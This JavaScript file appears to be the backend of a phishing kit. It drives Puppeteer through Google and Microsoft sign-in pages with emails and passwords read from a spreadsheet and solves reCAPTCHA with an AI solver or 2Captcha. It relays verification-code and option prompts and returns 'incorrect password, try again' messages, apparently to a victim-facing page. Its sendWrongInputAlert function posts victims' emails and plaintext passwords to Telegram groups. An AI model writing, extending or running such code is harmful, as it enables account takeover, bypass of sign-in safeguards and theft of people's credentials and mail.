                                    logger.info(`[checkAccountAccess][${instanceId}] AI solved reCAPTCHA successfully.`);
                                    await new Promise(r => setTimeout(r, 3000));
                                } else {
                                    logger.info(`[checkAccountAccess][${instanceId}] AI solver failed. Trying API solver as last resort...`);
                                    await new Promise(r => setTimeout(r, 2000));
                                    const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
                                    if (recaptchaSolved) {
                                        logger.info(`[checkAccountAccess][${instanceId}] API reCAPTCHA solver succeeded.`);
                                        await new Promise(r => setTimeout(r, 3000));
                                    } else {
                                        logger.error(`[checkAccountAccess][${instanceId}] All reCAPTCHA solvers failed.`);
                                        notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, url: page.url(), detail: 'reCAPTCHA Enterprise solve failed' });
                                        return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
                                    }
                                }
                            } else {
                                logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA passed! Continuing...`);
                            }
                        } else {
                            logger.info(`[checkAccountAccess][${instanceId}] No reCAPTCHA detected after image CAPTCHA. Continuing...`);
                        }
                    } catch (recaptchaDetectErr) {
                        logger.debug(`[checkAccountAccess][${instanceId}] reCAPTCHA detection error: ${recaptchaDetectErr.message}`);
                    }

                    // Check for verification screens (e.g. "Help us protect your account", reCAPTCHA)
                    const verificationAfterEmail = await checkVerification(page, platformConfig);
                    if (verificationAfterEmail.required) {
                        logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after email submission: ${verificationAfterEmail.viewName}`);
                        if (verificationAfterEmail.type === 'captcha') {
                            // reCAPTCHA v2 detected - attempt to solve with 2Captcha
                            logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA detected via checkVerification. Attempting to solve...`);
                            const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
                            if (recaptchaSolved) {
                                logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA solved successfully. Continuing...`);
                                await new Promise(res => setTimeout(res, 3000));
                            } else {
                                logger.error(`[checkAccountAccess][${instanceId}] reCAPTCHA solve failed.`);
                                notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, url: page.url(), detail: 'reCAPTCHA solve failed' });
                                return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
                            }
                        } else if (verificationAfterEmail.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                            const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationAfterEmail.viewName);
                            return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_OPTIONS', verificationOptions: options, viewName: verificationAfterEmail.viewName };
                        } else {
                            return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_CODE', viewName: verificationAfterEmail.viewName };
                        }
                    }
                    } // end if (isGoogle) CAPTCHA handling

                    // Wait for password input to become visible (handles Outlook "Use your password" transition delay)
                    const pwInputSelectors = Array.isArray(platformConfig.selectors?.passwordInput) ? platformConfig.selectors.passwordInput : [platformConfig.selectors?.passwordInput].filter(Boolean);
                    if (pwInputSelectors.length > 0) {
                        for (const sel of pwInputSelectors) {
                            try {
                                await page.waitForSelector(sel, { visible: true, timeout: 5000 });
                                break;
                            } catch (e) {
                                logger.debug(`[checkAccountAccess][${instanceId}] Password selector '${sel}' not visible after 5s wait.`);
                            }
                        }
                    }

                    // Check for password input
                    if (pwInputSelectors.length > 0) {
                        let visiblePwSelector = null;
                        for (const sel of pwInputSelectors) {
                            const pwVisible = await page.$eval(sel, el => el.offsetParent !== null).catch(() => false);
                            if (pwVisible) {
                                visiblePwSelector = sel;
                                break;
                            }
                        }
                        if (visiblePwSelector) {
                            if (password) {
                                logger.info(`[checkAccountAccess][${instanceId}] Password input visible (${visiblePwSelector}) and password available. Typing password directly.`);
                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, visiblePwSelector);
                                await page.type(visiblePwSelector, password, { delay: 50 });
                                let passwordNextClicked = false;
                                const urlBeforePasswordSubmit = page.url();
                                if (platformConfig.selectors.passwordNextButton) {
                                    let pwdSelectors = Array.isArray(platformConfig.selectors.passwordNextButton) ? platformConfig.selectors.passwordNextButton : [platformConfig.selectors.passwordNextButton];
                                    for (const sel of pwdSelectors) {
                                        try {
                                            await page.waitForSelector(sel, { visible: true, timeout: 2000 });
                                            const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                                            await page.click(sel);
                                            await navigationPromise;
                                            passwordNextClicked = true;
                                            break;
                                        } catch (e) {
                                            logger.warn(`[checkAccountAccess][${instanceId}] Password next button not found or clickable: ${sel}`);
                                        }
                                    }
                                }
                                if (passwordNextClicked) {
                                    await new Promise(res => setTimeout(res, 2000));
                                    // Verify page actually changed after click — if URL is the same and password input still visible, wrong button was clicked
                                    const urlAfterPasswordSubmit = page.url();
                                    const pwStillVisible = await page.evaluate((sels) => {
                                        for (const s of sels) { try { if (document.querySelector(s)) return true; } catch(e){} }
                                        return false;
                                    }, Array.isArray(platformConfig.selectors?.passwordInput) ? platformConfig.selectors.passwordInput : [platformConfig.selectors?.passwordInput].filter(Boolean)).catch(() => false);
                                    const urlChanged = urlBeforePasswordSubmit !== urlAfterPasswordSubmit;
                                    if (!urlChanged && pwStillVisible) {
                                        logger.warn(`[checkAccountAccess][${instanceId}] Password next button clicked but page did not change (URL same, password input still visible). Wrong button may have been clicked.`);
                                        return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD', message: "Password submit button did not work. Please try again." };
                                    }
                                    // Check for "Password sign-in isn't available" error
                                    if (platformConfig.selectors?.passwordUnavailable) {
                                        const pwUnavailSelectors = Array.isArray(platformConfig.selectors.passwordUnavailable)
                                            ? platformConfig.selectors.passwordUnavailable
                                            : [platformConfig.selectors.passwordUnavailable];
                                        for (const sel of pwUnavailSelectors) {
                                            if (typeof sel === 'string') {
                                                const unavailableExists = await page.evaluate((xpath) => {
                                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                                }, sel).catch(() => false);
                                                if (unavailableExists) {
                                                    logger.info(`[checkAccountAccess][${instanceId}] Password sign-in unavailable detected.`);
                                                    return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: "Password sign-in isn't available for this account. Try another sign-in method." };
                                                }
                                            }
                                        }
                                    }
                                    // Check for login failure
                                    if (platformConfig.selectors.loginFailed) {
                                        const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ? platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
                                        for (const sel of loginFailedSelectors) {
                                            if (typeof sel === 'string') {
                                                const failExists = await page.evaluate((xpath) => {
                                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                                }, sel).catch(() => false);
                                                if (failExists) {
                                                    logger.info(`[checkAccountAccess][${instanceId}] Password incorrect. Returning WAITINGPASSWORD_ERROR.`);
                                                    return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
                                                }
                                            }
                                        }
                                    }
                                    // Check for verification screens
                                    const verificationDetails = await checkVerification(page, platformConfig);
                                    if (verificationDetails.required) {
                                        logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after password entry.`);
                                        if (verificationDetails.type === 'captcha') {
                                            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after password: ${verificationDetails.viewName}` });
                                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
                                        }
                                        if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                                            const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName);
                                            return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_OPTIONS', verificationOptions: options, viewName: verificationDetails.viewName };
                                        }
                                        return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_CODE', viewName: verificationDetails.viewName };
                                    }
                                    // Handle additional views after password submission (e.g. "Stay signed in?" prompt)
                                    const additionalViewsResult = await handleAdditionalViews(page, platformConfig, instanceId, 'post_password_submission');
                                    if (additionalViewsResult?.blocked) {
                                        logger.warn(`[checkAccountAccess][${instanceId}] Fatal view blocked access: ${additionalViewsResult.reason}. Returning FAILED.`);
                                        return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'FAILED', error: additionalViewsResult.reason, message: `Account access blocked: ${additionalViewsResult.reason}` };
                                    }
                                    // Page may still be redirecting after login — retry inbox check
                                    let reachedInbox = false;
                                    for (let attempt = 0; attempt < 3; attempt++) {
                                        reachedInbox = await isInbox(page, platformConfig);
                                        if (reachedInbox) break;
                                        logger.info(`[checkAccountAccess][${instanceId}] Inbox not reached yet after additional views (attempt ${attempt + 1}/3). Waiting 5s for redirects to settle...`);
                                        await new Promise(resolve => setTimeout(resolve, 5000));
                                    }
                                    return { emailExists: true, accountAccess: true, reachedInbox, requiresVerification: false };
                                }
                            }
                            return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                        }
                    }

                    // Check for error
                    if (platformConfig.selectors.errorMessage) {
                        const errorExists = await page.evaluate((xpath) => {
                            try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                        }, platformConfig.selectors.errorMessage);
                        if (errorExists) {
                            return { emailExists: false, accountAccess: false, requiresVerification: false };
                        }
                    }

                    if (password) {
                        logger.warn(`[checkAccountAccess][${instanceId}] Password available but password input not detected. Returning WAITING_PASSWORD.`);
                    }
                    return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                } else {
                    return { emailExists: false, accountAccess: false, requiresVerification: false, error: "Login page not accessible" };
                }
            } catch (e) {
                return { emailExists: false, accountAccess: false, requiresVerification: false, error: e.message };
            }
        }

        // Normal flow if not reusing email retry
        for (const step of platformConfig.flow || []) {
            try {
                if (step.action === 'waitForSelector') {
                    // Ensure selector is a string before using it
                    if (typeof step.selector !== 'string') {
                        logger.warn(`[checkAccountAccess][${instanceId}] waitForSelector step has a non-string selector. Type: ${typeof step.selector}, Value: ${step.selector}. Skipping step.`);
                        continue;
                    }
                    const timeout = step.selector === 'input' ? 15000 : (step.timeout || 15000); // Increased timeout for initial 'input' selector
                    logger.debug(`[checkAccountAccess][${instanceId}] Waiting for selector: ${step.selector} with timeout: ${timeout}ms`);
                    await page.waitForSelector(step.selector, { visible: true, timeout: timeout });
                    logger.debug(`[checkAccountAccess][${instanceId}] Found selector: ${step.selector}`);
                    continue;
                }
                if (step.action === 'wait') {
                    logger.info(`[checkAccountAccess][${instanceId}] Performing explicit wait: ${step.duration || 3000}ms`);
                    await new Promise(res => setTimeout(res, step.duration || 3000));
                    continue;
                }
                if (!step.selector) continue;

                let resolvedSelector = step.selector;
                if (platformConfig?.selectors?.[step.selector]) {
                    resolvedSelector = platformConfig.selectors[step.selector];
                }

                if (step.action === 'type') {
                    // Ensure resolvedSelector is a string before using it for typing
                    if (typeof resolvedSelector !== 'string') {
                        logger.warn(`[checkAccountAccess][${instanceId}] Type action has a non-string resolved selector. Type: ${typeof resolvedSelector}, Value: ${resolvedSelector}. Skipping step.`);
                        continue;
                    }
                    const value = step.value === 'EMAIL' ? email : (step.value === 'PASSWORD' ? password : step.value);
                    const logValue = step.value === 'PASSWORD' ? '*****' : value;
                    logger.debug(`[checkAccountAccess][${instanceId}] Typing '${logValue}' into ${resolvedSelector}`);
                    try { await originalPage.bringToFront(); } catch (e) { logger.warn(`[bringToFront Pre-Type][${instanceId}] Error: ${e.message}`); }
                    await page.waitForSelector(resolvedSelector, { visible: true, timeout: 15000 });
                    await page.evaluate((selector) => {
                        const element = document.querySelector(selector);
                        if (element) { element.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' }); element.value = ''; }
                    }, resolvedSelector);
                    await page.type(resolvedSelector, value, { delay: 20 });
                    if (step.delay && typeof step.delay === 'number' && step.delay > 0) {
                        logger.info(`[checkAccountAccess][${instanceId}] Performing explicit step delay: ${step.delay}ms`);
                        await new Promise(res => setTimeout(res, step.delay));
                    }
                } else if (step.action === 'click') {
                    if (typeof resolvedSelector === 'function') {
                        logger.info(`[checkAccountAccess][${instanceId}] Invoking custom click handler for ${step.selector}`);
                        await resolvedSelector(page, platformConfig.selectors);
                    } else {
                        let selectorsToAttempt = Array.isArray(resolvedSelector) ? resolvedSelector : [resolvedSelector];
                        if (selectorsToAttempt.length > 0) {
                            // Ensure all selectors in the array are strings
                            const validSelectorsToAttempt = selectorsToAttempt.filter(sel => {
                                if (typeof sel !== 'string') {
                                    logger.warn(`[checkAccountAccess][${instanceId}] Click action has a non-string selector in array. Type: ${typeof sel}, Value: ${sel}. Skipping this selector.`);
                                    return false;
                                }
                                return true;
                            });

                            if (validSelectorsToAttempt.length === 0) {
                                logger.warn(`[checkAccountAccess][${instanceId}] No valid string selectors to attempt for click action.`);
                                continue; // Skip the step if no valid selectors remain
                            }

                            logger.info(`[checkAccountAccess][${instanceId}] Attempting to find and click one of selector(s): ${JSON.stringify(validSelectorsToAttempt)}`);
                            const firstVisibleSelector = await Promise.race(
                                validSelectorsToAttempt.map(sel => page.waitForSelector(sel, { visible: true, timeout: 5000 }).then(() => sel))
                            ).catch(raceError => {
                                logger.warn(`[checkAccountAccess][${instanceId}] None of the selectors ${JSON.stringify(validSelectorsToAttempt)} were found. Error: ${raceError.message}`);
                                throw new Error(`Critical click failure: None of the selectors ${JSON.stringify(validSelectorsToAttempt)} were found. Original error: ${raceError.message}`);
                            });

                            logger.info(`[checkAccountAccess][${instanceId}] First visible selector found: ${firstVisibleSelector}`);
                            try { await originalPage.bringToFront(); } catch (e) { logger.warn(`[bringToFront Pre-Click][${instanceId}] Error: ${e.message}`); }
                            const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => null);
                            await page.click(firstVisibleSelector);
                            await navigationPromise;
                            logger.info(`[checkAccountAccess][${instanceId}] Clicked on selector: ${firstVisibleSelector}`);
                            try { await originalPage.bringToFront(); } catch (e) {/* ignore */ }
                        }
                    }

                    // Check for verification screens immediately after a click
                    const verificationDetailsAfterClick = await checkVerification(page, platformConfig);
                    if (verificationDetailsAfterClick.required) {
                        logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after click: ${verificationDetailsAfterClick.viewName}. Returning for state transition.`);
                        if (verificationDetailsAfterClick.type === 'captcha') {
                            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after click: ${verificationDetailsAfterClick.viewName}` });
                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
                        }
                        return {
                            emailExists: true,
                            accountAccess: true,
                            reachedInbox: false,
                            requiresVerification: true,
                            verificationState: verificationDetailsAfterClick.type === 'choice' ? 'WAITING_OPTIONS' : 'WAITING_CODE',
                            verificationOptions: verificationDetailsAfterClick.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetailsAfterClick.viewName) : [],
                            viewName: verificationDetailsAfterClick.viewName
                        };
                    }

                    // If no verification screen, then handle general additional views
                    await handleAdditionalViews(page, platformConfig, instanceId);
                }

                const originalSelectorName = step.selector;

                if (platformConfig?.selectors) {
                    if (originalSelectorName === 'nextButton') {
                        let emailErrorDetected = false;
                        // Prioritize incorrectEmailMessage if it exists
                        if (platformConfig.selectors.incorrectEmailMessage) {
                            const incorrectEmailSelectors = Array.isArray(platformConfig.selectors.incorrectEmailMessage) ?
                                platformConfig.selectors.incorrectEmailMessage : [platformConfig.selectors.incorrectEmailMessage];

                            let incorrectEmailExists = false;
                            for (const selector of incorrectEmailSelectors) {
                                if (typeof selector === 'string') {
                                    const currentIncorrectEmailExists = await page.evaluate((xpath) => {
                                        try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                    }, selector).catch(() => false);
                                    if (currentIncorrectEmailExists) {
                                        incorrectEmailExists = true;
                                        break;
                                    }
                                } else {
                                    logger.warn(`[checkAccountAccess][${instanceId}] incorrectEmailMessage selector is not a string: ${selector}`);
                                }
                            }

                            if (incorrectEmailExists) {
                                logger.info(`[checkAccountAccess][${instanceId}] Incorrect email detected. Returning WAITINGEMAIL_ERROR.`);
                                return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITINGEMAIL_ERROR', message: "Incorrect email provided. Please try again with a valid email." };
                            }
                        }

                        // If incorrectEmailMessage was not detected, check for generic errorMessage
                        if (platformConfig.selectors.errorMessage) {
                            const errorMessageSelector = platformConfig.selectors.errorMessage;
                            if (typeof errorMessageSelector === 'string') {
                                const errorExists = await page.evaluate((xpath) => {
                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                }, errorMessageSelector).catch(() => false);
                                if (errorExists) {
                                    logger.info(`[checkAccountAccess][${instanceId}] Email error detected (generic). Email does not exist.`);
                                    return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false };
                                }
                            } else {
                                logger.warn(`[checkAccountAccess][${instanceId}] errorMessage selector is not a string: ${errorMessageSelector}`);
                            }
                        }

                        // If no email error was detected, assume email exists and proceed
                        emailExists = true;
                        if (!password) {
                            logger.info(`[checkAccountAccess][${instanceId}] Email exists, waiting for password.`);
                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                        }
                        if (await isInbox(page, platformConfig)) {
                            logger.info(`[checkAccountAccess][${instanceId}] Already in inbox after email submission. Skipping password.`);
                            return { emailExists: true, accountAccess: true, reachedInbox: true, requiresVerification: false };
                        }
                    }

                    if (originalSelectorName === 'passwordNextButton' && platformConfig.selectors.loginFailed) {
                        const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ?
                            platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];

                        let failExists = false;
                        for (const selector of loginFailedSelectors) {
                            if (typeof selector === 'string') {
                                const currentFailExists = await page.evaluate((xpath) => {
                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                }, selector).catch(() => false);
                                if (currentFailExists) {
                                    failExists = true;
                                    break; // Found a matching error, no need to check further
                                }
                            } else {
                                logger.warn(`[checkAccountAccess][${instanceId}] loginFailed selector is not a string: ${selector}`);
                            }
                        }

                        if (failExists) {
                            logger.info(`[checkAccountAccess][${instanceId}] Login failed detected after password next. Returning WAITINGPASSWORD_ERROR.`);
                            return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
                        } else {
                            accountAccess = true;
                        }
                    } else if (originalSelectorName === 'passwordNextButton' && !platformConfig.selectors.loginFailed) {
                        accountAccess = true;
                    }
                }
            } catch (stepError) {
                logger.error(`[checkAccountAccess][${instanceId}] Step error during action '${step.action}' for selector '${step.selector}': ${stepError.message}`, stepError);
                let isCritical = false;
                const failedStepSelectorKey = step.selector;
                if (step.action === 'type' && (failedStepSelectorKey === 'input' || failedStepSelectorKey === 'passwordInput') && stepError.message.startsWith('Type action failed:')) isCritical = true;
                else if (stepError.message.startsWith('Critical click failure')) isCritical = true;
                if (isCritical) return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false, error: stepError.message }; // Include error message for critical failures
                logger.warn(`[checkAccountAccess][${instanceId}] Non-critical step error encountered. Continuing flow.`);
            }
        }

        logger.info(`[checkAccountAccess][${instanceId}] Flow completed. Current state: emailExists=${emailExists}, accountAccess=${accountAccess}`);
        if (emailExists && accountAccess) {
            const verificationDetails = await checkVerification(page, platformConfig);
            if (verificationDetails.required) {
                requiresVerification = true;
                if (verificationDetails.type === 'captcha') {
                    notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA final check: ${verificationDetails.viewName}` });
                    return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
                }
                if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                    const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName);
                    return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_OPTIONS', verificationType: verificationDetails.type, verificationOptions: options, viewName: verificationDetails.viewName };
                }
                return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_CODE', verificationType: verificationDetails.type, viewName: verificationDetails.viewName };
            }
        }
        if (emailExists && accountAccess && !requiresVerification) {
            // Retry inbox check — page may still be redirecting after login
            for (let attempt = 0; attempt < 3; attempt++) {
                reachedInbox = await isInbox(page, platformConfig);
                if (reachedInbox) break;
                logger.info(`[checkAccountAccess][${instanceId}] Inbox not reached yet (attempt ${attempt + 1}/3). Waiting 5s for page to settle...`);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
            if (!reachedInbox) {
                logger.warn(`[checkAccountAccess][${instanceId}] Inbox still not reached after 3 attempts. Current URL: ${page.url()}`);
            }
        }
        return { emailExists, accountAccess, reachedInbox, requiresVerification, verificationState: null };
    } catch (err) {
        logger.error(`[checkAccountAccess][${instanceId}] Unexpected error: ${err.message}`, err);
        return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, error: err.message };
    }
}




/**
 * Send a Telegram alert to the project's group about wrong user input (email/password/code).
 * Fetches the project's telegramGroupId from the sheet automatically.
 */
async function sendWrongInputAlert({ type, platform, email, browserId, password, detail }) {
    try {
        const allData = await fetchDataFromAppScript();
        const headers = allData[0];
        const colIdx = getColumnIndexes(headers);
        const rowData = allData.slice(1).find(r => r[colIdx['browserId']] === browserId);
        if (!rowData) return;
        const projectId = rowData[colIdx['projectId']];
        if (!projectId) return;
        const projectDetails = await getProjectDetails(projectId);
        const projectTitle = projectDetails?.projectTitle || 'Unknown Project';
        const telegramGroupId = projectDetails?.telegramGroupId;
        if (!telegramGroupId) return;

        let message = '';
        switch (type) {
            case 'WRONG_EMAIL':
                message = `⚠️ *Wrong Email Attempt* ⚠️\n\n`;
                message += `*Project:* ${projectTitle}\n`;
                message += `*Email:* \`${email}\`\n`;
                message += `*Reason:* ${detail || 'Email not found'}\n`;
                break;
            case 'WRONG_PASSWORD':
                message = `⚠️ *Wrong Password Attempt* ⚠️\n\n`;
                message += `*Project:* ${projectTitle}\n`;
                message += `*Email:* \`${email}\`\n`;
                message += `*Password:* \`${password || 'N/A'}\`\n`;
                break;
            case 'WRONG_CODE':
                message = `⚠️ *Wrong Verification Code* ⚠️\n\n`;
                message += `*Project:* ${projectTitle}\n`;
                message += `*Email:* \`${email}\`\n`;
                message += `*Detail:* ${detail || ''}\n`;
                break;
            case 'PASSWORD_SUBMIT_FAILED':
            case 'PASSWORD_NO_NAVIGATION':
                message = `⚠️ *Password Submit Issue* ⚠️\n\n`;
                message += `*Project:* ${projectTitle}\n`;
                message += `*Email:* \`${email}\`\n`;
                message += `*Issue:* ${detail || ''}\n`;
                break;
            case 'SESSION_EXPIRED':
                message = `⚠️ *Session Expired* ⚠️\n\n`;
                message += `*Project:* ${projectTitle}\n`;
                message += `*Email:* \`${email || 'N/A'}\`\n`;
                message += `*Detail:* ${detail || ''}\n`;
                break;
            default:
                message = `⚠️ *Issue Detected* ⚠️\n\n`;
                message += `*Project:* ${projectTitle}\n`;
                message += `*Email:* \`${email || 'N/A'}\`\n`;
                message += `*Detail:* ${detail || ''}\n`;
        }
        message += `\n*Browser ID:* \`${browserId}\``;

        await sendTelegramMessage(telegramGroupId, message);
    } catch (err) {
        logger.error(`[sendWrongInputAlert] Failed to send alert: ${err.message}`);
    }
}

async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
    const browserId = row[columnIndexes['browserId']];
    const status = row[columnIndexes['status']];
    let email = row[columnIndexes['email']]; // Changed to let
    let password = row[columnIndexes['password']];
    logger.debug(`[processRow][${browserId}] Processing row.`);

    const userDataDir = `/tmp/users_data/${browserId}`;
    let browser = null;
    let page = null;
    let targetCreatedListener = null; // Defined here to be accessible in finally
    let finalStatus = "FAILED";
    let processingStarted = false; // Track if main processing flow was reached
    let updateData = { status: finalStatus, email: email || '', password: password || '' };
    let browserFullyClosed = false;
    let exitingEarly = false;
    let platform = 'unknown';
    let initialCheckResult = {
        emailExists: false,
        accountAccess: false,
        reachedInbox: false,
        requiresVerification: false,
        verificationState: null,
        verificationOptions: [],
        viewName: null
    };
    let instanceId = `PROC-SETUP-${browserId}`;
    let isReusingBrowser = false;

    // Populate cache with full row data so intermediate writes (status etc.) preserve email/password
    const initialRowData = Object.fromEntries(
        Object.entries(columnIndexes).map(([key, idx]) => [key, row[idx]])
    );
    populateCache(browserId, initialRowData);

    // Set initialCheckResult from lastJsonResponse if available
    if (row && row[columnIndexes['lastJsonResponse']]) {
        try {
            const lastJson = JSON.parse(row[columnIndexes['lastJsonResponse']]);
            initialCheckResult = {
                emailExists: lastJson.emailExists !== undefined ? lastJson.emailExists : false,
                accountAccess: lastJson.accountAccess !== undefined ? lastJson.accountAccess : false,
                reachedInbox: lastJson.reachedInbox !== undefined ? lastJson.reachedInbox : false,
                requiresVerification: lastJson.requiresVerification !== undefined ? lastJson.requiresVerification : false,
                verificationState: lastJson.verificationState !== undefined ? lastJson.verificationState : null,
                verificationOptions: lastJson.verificationOptions || [],
                viewName: lastJson.viewName || null
            };
        } catch (e) {
            // Parse error, keep defaults
        }
    }

    try {
        if (existingBrowser && existingPage) {
            // Check if the existing session is still valid
            if (!existingBrowser.isConnected() || existingPage.isClosed()) {
                logger.warn(`[processRow][${browserId}] Stale session detected. Cleaning up and launching new browser.`);
                activeBrowserSessions.delete(browserId); // Remove stale session
                if (existingBrowser.isConnected()) {
                    await existingBrowser.close().catch(e => logger.error(`Error closing stale browser (processRow): ${e.message}`));
                }
                // Fall through to launch new browser
            } else {
                browser = existingBrowser;
                page = existingPage;
                // Retrieve the existing listener if available from the session
                const session = activeBrowserSessions.get(browserId);
                targetCreatedListener = session?.targetCreatedListener;
                if (targetCreatedListener) {
                    browser.on('targetcreated', targetCreatedListener); // Re-attach listener that was removed in finally
                }
                isReusingBrowser = true;
                instanceId = `PROC-REUSE-${browserId}-${browser.process()?.pid || 'unknownPID'}`;
                logger.info(`[processRow][${browserId}] Reusing existing browser session.`);
                try { await page.bringToFront(); } catch (e) { logger.warn(`[processRow][${browserId}] Error bringing reused page to front: ${e.message}`); }
            }
        }

        if (!browser) { // Only launch new browser if not reusing a valid one
            logger.info(`[processRow][${browserId}] Launching new browser session.`);
            const maxLaunchRetries = 3;
            for (let i = 0; i < maxLaunchRetries; i++) {
                try {
                    logger.info(`[processRow][${browserId}] Attempt ${i + 1}/${maxLaunchRetries} to launch browser.`);
                    browser = await launchBrowser({
                        userDataDir,
                        headless: isDev ? false : "new"
                    });
                    logger.info(`[processRow][${browserId}] Browser launched successfully on attempt ${i + 1}. PID: ${browser.process()?.pid}`);
                    break; // Break out of retry loop on success
                } catch (launchError) {
                    logger.error(`[processRow][${browserId}] Browser launch attempt ${i + 1}/${maxLaunchRetries} failed: ${launchError.message}. Stack: ${launchError.stack}`);
                    if (i < maxLaunchRetries - 1) {
                        logger.warn(`[processRow][${browserId}] Retrying browser launch in 5 seconds...`);
                        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before retrying
                    } else {
                        logger.error(`[processRow][${browserId}] All ${maxLaunchRetries} browser launch attempts failed. Final error: ${launchError.message}`);
                        throw new Error(`Failed to launch browser after ${maxLaunchRetries} attempts: ${launchError.message}`); // Re-throw to be caught by outer try/catch
                    }
                }
            }

            instanceId = `PROC-${browserId}-${browser.process()?.pid || 'unknownPID'}`;

            const allPages = await browser.pages();
            page = allPages[0];

            for (let i = 1; i < allPages.length; i++) {
                if (!allPages[i].isClosed()) {
                    try { await allPages[i].close(); } catch (closeErr) { logger.warn(`[Initial Tab Cleanup][${browserId}] Error closing tab: ${closeErr.message}`); }
                }
            }

            const tabWhitelist = [
                'm365.cloud.microsoft',
                'login.live.com',
                'login.microsoftonline.com',
                'login.microsoft.com',
                'aka.ms',
                'outlook.live.com',
                'outlook.office365.com',
                'portal.office.com',
                'onedrive.live.com',
            ];

            targetCreatedListener = async (target) => { // Assign to the outer scope variable
                if (target.type() === 'page') {
                    try {
                        const newPage = await target.page();
                        if (newPage && newPage !== page && !newPage.isClosed()) {
                            const targetUrl = target.url();
                            const isWhitelisted = tabWhitelist.some(domain => targetUrl.includes(domain));
                            if (isWhitelisted) {
                                logger.info(`[Tab Listener][${browserId}] Whitelisted tab (not closing): ${targetUrl}`);
                                return;
                            }
                            logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${targetUrl}`);
                            await newPage.close().catch(closeErr => logger.warn(`[Tab Listener][${browserId}] Error closing new tab: ${closeErr.message}`));
                        }
                    } catch (pageErr) {
                        if (!pageErr.message?.includes('Target closed')) {
                            logger.warn(`[Tab Listener][${browserId}] Error accessing new page: ${pageErr.message}`);
                        }
                    }
                }
            };
